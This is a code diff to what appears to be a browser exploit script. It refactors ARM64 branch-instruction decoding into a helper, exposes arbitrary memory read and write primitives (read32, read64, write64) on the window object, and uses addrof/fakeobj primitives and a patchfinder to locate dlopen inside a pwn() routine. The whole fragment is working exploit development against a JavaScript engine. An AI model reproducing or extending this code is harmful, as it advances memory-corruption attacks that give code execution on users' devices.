@@ -105,6 +105,16 @@ function setup_addrof_fakeobj() {
     return [addrof, fakeobj];
 }
 
+function follow_bl(addr) {
+    var opcode = read32(addr);
+    var imm = (opcode & 0x3FFFFFF) << 2;
+    if (opcode & 0x2000000) {
+        imm |= 0xf << 28;
+    }
+    addr = Add(addr, imm);
+    return addr;
+}
+
 function pwn() {
     offsets.resolve();
 
@@ -201,6 +211,10 @@ function pwn() {
         return read64(Add(addrof(arr), 0x10));
     }
 
+    window.read32 = read32;
+    window.read64 = read64;
+    window.write64 = write64;
+    
     var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
     var FPO = spectre ? 0x18 : 0x10; 
     log(`[*] FPO: ${FPO}`);
@@ -254,13 +268,10 @@ function pwn() {
 
     // where to call?
     // BL addr
-    var imm = (opcode & 0x3FFFFFF) << 2;
-    log(`[+] imm: ${imm}`);
-    if (opcode & 0x2000000) {
-        imm |= 0xf << 28;
-    }
-    var dlopen_addr = Add(bl_dlopen_addr, imm);
+    var dlopen_addr = follow_bl(bl_dlopen_addr);
     log(`[+] dlopen_addr: ${dlopen_addr}`);
+
+
 
     // remove this "return" if finished patchfinder
     return;
